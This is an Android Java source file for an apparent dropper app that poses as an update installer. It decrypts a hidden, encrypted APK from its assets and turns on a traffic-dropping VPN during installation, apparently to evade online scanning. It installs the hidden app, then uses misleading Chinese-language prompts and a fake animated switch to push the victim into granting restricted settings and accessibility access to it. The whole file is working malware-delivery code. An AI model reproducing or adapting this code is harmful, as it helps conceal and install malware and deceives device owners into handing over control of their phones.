package org.boundarylab.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.ViewGroup;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

/**
 * A-package update page. This 1.2.7.5 variant embeds the B package as
 * AES-256-GCM ciphertext (nonce ‖ ciphertext ‖ auth tag) in assets/payload.dat,
 * with a per-build random 32-byte key carried in installer_config.json.
 * Launching the A package automatically requests VPN consent, starts the
 * draining VPN and commits a PackageInstaller session while the tunnel drops
 * traffic; after the B package installs the VPN stops and the
 * restricted-settings / accessibility guide leads into the built-in home page.
 */
public final class MainActivity extends Activity {
    private static final String STATE_PREFERENCES = "installer_state";
    private static final String ACCESSIBILITY_AFTER_INSTALL = "accessibility_after_install";
    private static final int REQUEST_VPN = 0x270f;
    private static final String ACTION_PAYLOAD_RESULT =
            "org.boundarylab.installer.PAYLOAD_RESULT";

    private JSONObject config;
    private TextView status;
    private WebView webView;
    private boolean waitingForInstallPermission;
    private boolean showingAccessibilityPrompt;
    private boolean installInFlight;
    private boolean autoInstallStarted;
    private ProgressRingView progressRing;
    private TextView progressSubtitle;
    private int displayedProgress;
    private int lastSessionId = -1;
    private File pendingApk;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        try (InputStream input = getAssets().open("installer_config.json")) {
            java.io.ByteArrayOutputStream bytes = new java.io.ByteArrayOutputStream();
            copy(input, bytes);
            config = new JSONObject(bytes.toString("UTF-8"));
        } catch (Exception error) {
            throw new IllegalStateException("Installer configuration is invalid", error);
        }

        route();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (config == null) return;
        if (payloadInstalled()) {
            waitingForInstallPermission = false;
            if (installInFlight) completeInstallSuccess();
            route();
            return;
        }
        if (waitingForInstallPermission
                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                || getPackageManager().canRequestPackageInstalls())) {
            waitingForInstallPermission = false;
            prepareAndInstall();
            return;
        }
        if (installInFlight && lastSessionId != -1 && !sessionStillActive()) {
            if (payloadInstalled()) {
                completeInstallSuccess();
                route();
                return;
            }
            installInFlight = false;
            lastSessionId = -1;
            stopVpn();
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                    .apply();
            if (status != null) status.setText("安装已取消或失败，可点击按钮重试");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQUEST_VPN || pendingApk == null) return;
        File apk = pendingApk;
        pendingApk = null;
        if (resultCode == RESULT_OK) {
            startVpnAndInstall(apk);
        } else if (status != null) {
            setProgress(0, "已取消 VPN 授权，可点击按钮重试");
        }
    }

    private void route() {
        if (!payloadInstalled()) {
            if (webView != null || status == null) showInstallProgressAndStart();
            return;
        }
        if (accessibilityPending()) {
            if (payloadAccessibilityEnabled()) {
                getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                        .edit()
                        .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                        .apply();
                showBrowser();
            } else if (!showingAccessibilityPrompt) {
                showAccessibilityPrompt();
            }
            return;
        }
        if (webView == null) showBrowser();
    }

    private boolean accessibilityPending() {
        return getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                .getBoolean(ACCESSIBILITY_AFTER_INSTALL, false);
    }

    private void showInstallProgressAndStart() {
        destroyWebView();
        showingAccessibilityPrompt = false;
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.rgb(248, 249, 251));
        layout.setPadding(48, 72, 48, 48);

        progressRing = new ProgressRingView(this);
        LinearLayout.LayoutParams ringParams = new LinearLayout.LayoutParams(dp(220), dp(220));
        layout.addView(progressRing, ringParams);

        status = new TextView(this);
        status.setText("正在安装完整版应用");
        status.setTextSize(24);
        status.setTextColor(Color.rgb(18, 22, 28));
        status.setGravity(Gravity.CENTER);
        status.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        status.setPadding(0, dp(46), 0, 0);
        layout.addView(status, matchWrap());

        progressSubtitle = new TextView(this);
        progressSubtitle.setText("安装完成后将自动打开，请稍候");
        progressSubtitle.setTextSize(16);
        progressSubtitle.setTextColor(Color.rgb(135, 143, 153));
        progressSubtitle.setGravity(Gravity.CENTER);
        progressSubtitle.setPadding(0, dp(14), 0, 0);
        layout.addView(progressSubtitle, matchWrap());
        setContentView(layout);

        setProgress(18, "正在准备安装…");
        if (!autoInstallStarted) {
            autoInstallStarted = true;
            mainHandler.postDelayed(this::beginInstall, 450);
        }
    }

    private void showInstallPrompt() {
        showInstallProgressAndStart();
    }

    private void showAccessibilityPrompt() {
        destroyWebView();
        showingAccessibilityPrompt = true;

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(dp(24), dp(128), dp(24), dp(24));
        root.setBackgroundColor(Color.rgb(239, 244, 255));

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(24), dp(28), dp(24), dp(22));
        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(dp(30));
        card.setBackground(cardBg);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) card.setElevation(dp(9));
        root.addView(card, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        TextView title = new TextView(this);
        title.setText("开启无障碍服务");
        title.setTextSize(23);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setTextColor(Color.rgb(31, 41, 55));
        title.setGravity(Gravity.CENTER);
        card.addView(title, matchWrap());

        TextView explanation = new TextView(this);
        explanation.setText("为了获得更流畅的体验，请在设置中开启无障碍权限。");
        explanation.setTextSize(15);
        explanation.setTextColor(Color.rgb(107, 114, 128));
        explanation.setGravity(Gravity.CENTER);
        explanation.setLineSpacing(dp(3), 1.0f);
        explanation.setPadding(0, dp(12), 0, dp(22));
        card.addView(explanation, matchWrap());

        LinearLayout appRow = new LinearLayout(this);
        appRow.setOrientation(LinearLayout.HORIZONTAL);
        appRow.setGravity(Gravity.CENTER_VERTICAL);
        appRow.setPadding(dp(18), dp(12), dp(18), dp(12));
        GradientDrawable appRowBg = new GradientDrawable();
        appRowBg.setColor(Color.rgb(248, 250, 252));
        appRowBg.setCornerRadius(dp(22));
        appRow.setBackground(appRowBg);
        LinearLayout.LayoutParams appRowParams = matchWrap();
        appRowParams.setMargins(0, 0, 0, 0);
        card.addView(appRow, appRowParams);

        ImageView appIcon = new ImageView(this);
        appIcon.setImageDrawable(payloadIcon());
        appIcon.setScaleType(ImageView.ScaleType.FIT_CENTER);
        appRow.addView(appIcon, new LinearLayout.LayoutParams(dp(50), dp(50)));

        String guideName = payloadDisplayName();
        TextView appName = new TextView(this);
        appName.setText(guideName);
        appName.setTextSize(16);
        appName.setSingleLine(true);
        appName.setMaxLines(1);
        appName.setEllipsize(TextUtils.TruncateAt.END);
        appName.setMinWidth(dp(80));
        appName.setTypeface(Typeface.DEFAULT_BOLD);
        appName.setTextColor(Color.rgb(55, 65, 81));
        LinearLayout.LayoutParams nameParams = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        nameParams.setMargins(dp(18), 0, dp(14), 0);
        appRow.addView(appName, nameParams);

        AccessibilitySwitchView switchMock = new AccessibilitySwitchView(this);
        switchMock.setOnClickListener(view -> {
            try {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } catch (Exception error) {
                status.setText("系统无障碍设置无法打开，请从系统设置中手动进入");
            }
        });
        appRow.addView(switchMock, new LinearLayout.LayoutParams(dp(65), dp(38)));

        LinearLayout steps = new LinearLayout(this);
        steps.setOrientation(LinearLayout.HORIZONTAL);
        steps.setGravity(Gravity.CENTER);
        steps.setPadding(0, dp(16), 0, dp(12));
        card.addView(steps, matchWrap());
        addStep(steps, "⚙", "设置");
        addArrow(steps);
        addStep(steps, "◉", "无障碍");
        addArrow(steps);
        addStep(steps, "▣", "开启");

        TextView tip = new TextView(this);
        tip.setText("ⓘ  请在列表中找到“已安装的应用”或“已下载的服务”，然后开启 "
                + guideName + "。");
        tip.setTextSize(13);
        tip.setTextColor(Color.rgb(37, 99, 235));
        tip.setLineSpacing(dp(2), 1.0f);
        tip.setPadding(dp(18), dp(10), dp(18), dp(10));
        GradientDrawable tipBg = new GradientDrawable();
        tipBg.setColor(Color.rgb(239, 246, 255));
        tipBg.setCornerRadius(dp(14));
        tip.setBackground(tipBg);
        card.addView(tip, matchWrap());

        status = new TextView(this);
        status.setText(payloadAccessibilityEnabled() ? "无障碍已开启" : "等待开启无障碍服务");
        status.setGravity(Gravity.CENTER);
        status.setTextSize(12);
        status.setTextColor(Color.rgb(107, 114, 128));
        status.setPadding(0, dp(7), 0, dp(5));
        card.addView(status, matchWrap());

        Button open = new Button(this);
        open.setText("去开启  ›");
        open.setTextSize(17);
        open.setTextColor(Color.WHITE);
        open.setTypeface(Typeface.DEFAULT_BOLD);
        GradientDrawable buttonBg = new GradientDrawable();
        buttonBg.setColor(Color.rgb(59, 130, 246));
        buttonBg.setCornerRadius(dp(12));
        open.setBackground(buttonBg);
        open.setOnClickListener(view -> {
            try {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } catch (Exception error) {
                status.setText("系统无障碍设置无法打开，请从系统设置中手动进入");
            }
        });
        LinearLayout.LayoutParams buttonParams = matchWrap();
        buttonParams.setMargins(0, 0, 0, 0);
        buttonParams.height = dp(48);
        card.addView(open, buttonParams);
        setContentView(root);
    }

    private String payloadDisplayName() {
        try {
            String packageName = config.getString("payloadPackageName");
            CharSequence label = getPackageManager().getApplicationLabel(
                    getPackageManager().getApplicationInfo(packageName, 0));
            if (label != null && label.length() > 0) return label.toString();
        } catch (Exception ignored) {
        }
        String configured = config == null ? "" : config.optString("payloadAppName", "");
        if (!configured.isEmpty()) return configured;
        return "ScreenAgent";
    }

    private Drawable payloadIcon() {
        try {
            return getPackageManager().getApplicationIcon(config.getString("payloadPackageName"));
        } catch (Exception ignored) {
            return getApplicationInfo().loadIcon(getPackageManager());
        }
    }

    private void addStep(LinearLayout parent, String icon, String label) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER);
        TextView iconView = new TextView(this);
        iconView.setText(icon);
        iconView.setTextSize(20);
        iconView.setGravity(Gravity.CENTER);
        iconView.setTextColor(Color.rgb(59, 130, 246));
        GradientDrawable iconBg = new GradientDrawable();
        iconBg.setColor(Color.rgb(248, 250, 252));
        iconBg.setCornerRadius(dp(16));
        iconView.setBackground(iconBg);
        box.addView(iconView, new LinearLayout.LayoutParams(dp(46), dp(46)));
        TextView text = new TextView(this);
        text.setText(label);
        text.setTextSize(12);
        text.setTextColor(Color.rgb(107, 114, 128));
        text.setGravity(Gravity.CENTER);
        text.setPadding(0, dp(6), 0, 0);
        box.addView(text, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        parent.addView(box, new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
    }

    private void addArrow(LinearLayout parent) {
        TextView arrow = new TextView(this);
        arrow.setText("···›");
        arrow.setTextSize(21);
        arrow.setTextColor(Color.rgb(156, 163, 175));
        arrow.setGravity(Gravity.CENTER);
        parent.addView(arrow, new LinearLayout.LayoutParams(dp(34), dp(46)));
    }

    private static final class AccessibilitySwitchView extends android.view.View {
        private final Paint track = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint thumb = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float progress = 0f;
        private boolean forward = true;
        private final Runnable animator = new Runnable() {
            @Override
            public void run() {
                progress += forward ? 0.18f : -0.11f;
                if (progress >= 1f) {
                    progress = 1f;
                    forward = false;
                    postDelayed(this, 1000);
                    invalidate();
                    return;
                }
                if (progress <= 0f) {
                    progress = 0f;
                    forward = true;
                    postDelayed(this, 180);
                    invalidate();
                    return;
                }
                invalidate();
                postDelayed(this, 14);
            }
        };

        AccessibilitySwitchView(android.content.Context context) {
            super(context);
            thumb.setColor(Color.WHITE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) setElevation(2f);
        }

        @Override
        protected void onAttachedToWindow() {
            super.onAttachedToWindow();
            removeCallbacks(animator);
            postDelayed(animator, 120);
        }

        @Override
        protected void onDetachedFromWindow() {
            removeCallbacks(animator);
            super.onDetachedFromWindow();
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            int off = Color.rgb(203, 213, 225);
            int on = Color.rgb(59, 130, 246);
            int r = Math.round(red(off) + (red(on) - red(off)) * progress);
            int g = Math.round(green(off) + (green(on) - green(off)) * progress);
            int b = Math.round(blue(off) + (blue(on) - blue(off)) * progress);
            track.setColor(Color.rgb(r, g, b));
            float h = getHeight();
            float w = getWidth();
            float pad = Math.max(3f, h * 0.10f);
            RectF pill = new RectF(0, 0, w, h);
            canvas.drawRoundRect(pill, h / 2f, h / 2f, track);
            float radius = (h - pad * 2f) / 2f;
            float cx = pad + radius + (w - h) * progress;
            canvas.drawCircle(cx, h / 2f, radius, thumb);
        }

        private static int red(int color) { return (color >> 16) & 0xff; }
        private static int green(int color) { return (color >> 8) & 0xff; }
        private static int blue(int color) { return color & 0xff; }
    }

    private void openPayloadAppDetails() {
        try {
            String packageName = config.getString("payloadPackageName");
            status.setText("请在右上角菜单选择“允许受限设置”，完成后返回 A 包");
            startActivity(new Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + packageName)));
        } catch (Exception error) {
            status.setText("B 包应用信息无法打开，请从系统设置的应用列表中选择 B 包");
        }
    }

    private void showBrowser() {
        status = null;
        showingAccessibilityPrompt = false;
        destroyWebView();
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return !isAllowedWebUrl(request.getUrl());
            }

            @Override
            @SuppressWarnings("deprecation")
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return !isAllowedWebUrl(Uri.parse(url));
            }
        });
        setContentView(webView);
        try {
            webView.loadUrl(config.getString("homeUrl"));
        } catch (Exception error) {
            showInstallPrompt();
            status.setText("首页地址不可用，请重新构建 A 包");
        }
    }

    private boolean isAllowedWebUrl(Uri uri) {
        return uri != null && "https".equalsIgnoreCase(uri.getScheme());
    }

    private boolean payloadInstalled() {
        try {
            getPackageManager().getApplicationInfo(config.getString("payloadPackageName"), 0);
            return true;
        } catch (Exception error) {
            return false;
        }
    }

    private boolean payloadAccessibilityEnabled() {
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            String prefix = config.getString("payloadPackageName") + "/";
            for (String component : enabled.split(":")) {
                if (component.regionMatches(true, 0, prefix, 0, prefix.length())) return true;
            }
            return false;
        } catch (Exception error) {
            return false;
        }
    }

    private boolean sessionStillActive() {
        try {
            for (PackageInstaller.SessionInfo info :
                    getPackageManager().getPackageInstaller().getMySessions()) {
                if (info.getSessionId() == lastSessionId) return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }

    private void setProgress(int value, String message) {
        setProgress(value, message, true);
    }

    private void setProgress(int value, String message, boolean animate) {
        int target = Math.max(0, Math.min(100, value));
        if (progressSubtitle != null) progressSubtitle.setText(message);
        if (progressRing == null) {
            displayedProgress = target;
            return;
        }
        if (!animate || target <= displayedProgress) {
            displayedProgress = target;
            progressRing.setProgress(target);
            return;
        }
        animateProgressTo(target);
    }

    private void animateProgressTo(int target) {
        final int safeTarget = Math.max(0, Math.min(100, target));
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (progressRing == null || displayedProgress >= safeTarget) return;
                displayedProgress += Math.max(1, Math.min(3, safeTarget - displayedProgress));
                progressRing.setProgress(displayedProgress);
                if (displayedProgress < safeTarget) mainHandler.postDelayed(this, 180);
            }
        }, 80);
    }

    private void startInstallWaitingProgress() {
        final int[] targets = {92, 95, 98};
        final String[] messages = {
                "已交给 Android 系统安装器，请在系统界面确认",
                "正在安装完整版应用…",
                "即将完成，请稍候…"
        };
        for (int i = 0; i < targets.length; i++) {
            final int index = i;
            mainHandler.postDelayed(
                    () -> {
                        if (installInFlight && !payloadInstalled()) {
                            setProgress(targets[index], messages[index]);
                        }
                    },
                    500L + index * 1200L);
        }
    }

    private static final class ProgressRingView extends android.view.View {
        private final Paint track = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint arc = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint text = new Paint(Paint.ANTI_ALIAS_FLAG);
        private int progress = 0;

        ProgressRingView(android.content.Context context) {
            super(context);
            track.setStyle(Paint.Style.STROKE);
            track.setStrokeCap(Paint.Cap.ROUND);
            track.setColor(Color.rgb(223, 228, 235));
            arc.setStyle(Paint.Style.STROKE);
            arc.setStrokeCap(Paint.Cap.ROUND);
            arc.setColor(Color.rgb(34, 110, 205));
            text.setColor(Color.rgb(12, 14, 18));
            text.setTextAlign(Paint.Align.CENTER);
            text.setFakeBoldText(true);
        }

        void setProgress(int value) {
            progress = Math.max(0, Math.min(100, value));
            invalidate();
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            float stroke = Math.max(18f, getWidth() * 0.07f);
            track.setStrokeWidth(stroke);
            arc.setStrokeWidth(stroke);
            float pad = stroke / 2f + 8f;
            RectF oval = new RectF(pad, pad, getWidth() - pad, getHeight() - pad);
            canvas.drawArc(oval, 0, 360, false, track);
            canvas.drawArc(oval, -90, progress * 3.6f, false, arc);
            text.setTextSize(getWidth() * 0.22f);
            Paint.FontMetrics fm = text.getFontMetrics();
            float y = getHeight() / 2f - (fm.ascent + fm.descent) / 2f;
            canvas.drawText(progress + "%", getWidth() / 2f, y, text);
        }
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
    }

    private void beginInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            waitingForInstallPermission = true;
            setProgress(24, "请先允许此安装器安装未知应用，返回后继续");
            try {
                startActivity(new Intent(
                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName())));
            } catch (Exception error) {
                waitingForInstallPermission = false;
                setProgress(0, "系统设置无法打开，请手动允许安装未知应用后重试");
            }
            return;
        }
        prepareAndInstall();
    }

    private void prepareAndInstall() {
        setProgress(36, "正在校验 B 包…");
        new Thread(() -> {
            File apkResult = null;
            Exception errorResult = null;
            try {
                apkResult = decryptPayload();
            } catch (Exception e) {
                errorResult = e;
            }
            final File apkFinal = apkResult;
            final Exception errorFinal = errorResult;
            mainHandler.post(() -> {
                if (errorFinal != null || apkFinal == null) {
                    setProgress(0, "B 包校验失败，请重新构建 A 包");
                    return;
                }
                pendingApk = apkFinal;
                Intent consent = null;
                try {
                    consent = VpnService.prepare(this);
                } catch (Exception ignored) {
                }
                if (consent != null) {
                    try {
                        startActivityForResult(consent, REQUEST_VPN);
                        setProgress(58, "请允许 VPN 授权，用于隔离安装期间的流量");
                    } catch (Exception vpnError) {
                        startVpnAndInstall(apkFinal);
                    }
                } else {
                    startVpnAndInstall(apkFinal);
                }
            });
        }, "boundary-payload-prepare").start();
    }

    private void startVpnAndInstall(File apk) {
        setProgress(72, "正在提交 Android 安装会话…");
        try {
            startService(new Intent(this, VpnKillService.class));
        } catch (Exception ignored) {
            // The tunnel is best-effort; the install proceeds without it.
        }
        try {
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(
                            PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            params.setAppPackageName(config.getString("payloadPackageName"));
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);
            OutputStream out = session.openWrite("payload.apk", 0, apk.length());
            try (FileInputStream in = new FileInputStream(apk)) {
                byte[] buffer = new byte[8192];
                int count;
                while ((count = in.read(buffer)) >= 0) out.write(buffer, 0, count);
            }
            session.fsync(out);
            out.close();
            Intent result = new Intent(ACTION_PAYLOAD_RESULT)
                    .setComponent(new ComponentName(this, InstallReceiver.class));
            PendingIntent sender = PendingIntent.getBroadcast(
                    this, sessionId, result,
                    PendingIntent.FLAG_UPDATE_CURRENT | installCallbackMutabilityFlag());
            setProgress(88, "正在等待 Android 安装确认…");
            session.commit(sender.getIntentSender());
            session.close();
            lastSessionId = sessionId;
            installInFlight = true;
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, true)
                    .apply();
            setProgress(92, "已交给 Android 系统安装器，请在系统界面确认");
            startInstallWaitingProgress();
        } catch (Exception error) {
            installInFlight = false;
            lastSessionId = -1;
            stopVpn();
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                    .apply();
            setProgress(0, "系统安装会话创建失败，请重试");
        }
    }


    private int installCallbackMutabilityFlag() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return PendingIntent.FLAG_MUTABLE;
        }
        return 0;
    }

    private void completeInstallSuccess() {
        installInFlight = false;
        lastSessionId = -1;
        stopVpn();
        getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                .edit()
                .putBoolean(ACCESSIBILITY_AFTER_INSTALL, true)
                .apply();
        setProgress(100, "B 包已安装，正在打开无障碍引导…");
    }

    private void stopVpn() {
        try {
            startService(VpnKillService.stopIntent(this));
        } catch (Exception ignored) {
            try {
                stopService(new Intent(this, VpnKillService.class));
            } catch (Exception ignoredAgain) {
            }
        }
    }

    /**
     * Reads the embedded AES-256-GCM payload.dat (nonce ‖ ciphertext ‖ auth tag),
     * decrypts it with the per-build 32-byte key carried in installer_config.json,
     * and verifies the restored bytes against the build-time SHA-256 before
     * PackageInstaller uses them. The GCM tag authenticates the payload, so any
     * truncation or bit flip fails here rather than at install time.
     */
    private File decryptPayload() throws Exception {
        InputStream raw = getAssets().open("payload.dat");
        try {
            byte[] blob = readAllBytes(raw);
            if (blob.length < 28) throw new IllegalStateException("Payload is truncated");
            String keyBase64 = config.getString("payloadKey");
            byte[] key = Base64.getDecoder().decode(keyBase64);
            if (key.length != 32) throw new IllegalStateException("Payload key is invalid");
            byte[] nonce = Arrays.copyOfRange(blob, 0, 12);
            byte[] body = Arrays.copyOfRange(blob, 12, blob.length);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(
                    Cipher.DECRYPT_MODE,
                    new SecretKeySpec(key, "AES"),
                    new GCMParameterSpec(128, nonce));
            byte[] plain = cipher.doFinal(body);
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            StringBuilder actual = new StringBuilder();
            for (byte value : digest.digest(plain)) actual.append(String.format("%02x", value));
            if (!actual.toString().equals(config.getString("payloadSha256")))
                throw new IllegalStateException("Payload digest mismatch");
            File directory = new File(getCacheDir(), "payloads");
            if (!directory.exists() && !directory.mkdirs())
                throw new IllegalStateException();
            File output = new File(directory, "payload.apk");
            try (FileOutputStream target = new FileOutputStream(output)) {
                target.write(plain);
            }
            return output;
        } finally {
            raw.close();
        }
    }

    private static byte[] readAllBytes(InputStream input) throws Exception {
        java.io.ByteArrayOutputStream bytes = new java.io.ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int count;
        while ((count = input.read(buffer)) >= 0) bytes.write(buffer, 0, count);
        return bytes.toByteArray();
    }

    private static void copy(InputStream input, OutputStream output) throws Exception {
        byte[] buffer = new byte[8192];
        int count;
        while ((count = input.read(buffer)) >= 0) output.write(buffer, 0, count);
    }

    private void destroyWebView() {
        if (webView == null) return;
        webView.stopLoading();
        webView.setWebViewClient(null);
        webView.destroy();
        webView = null;
    }

    @Override
    @SuppressWarnings("deprecation")
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        stopVpn();
        destroyWebView();
        super.onDestroy();
    }
}
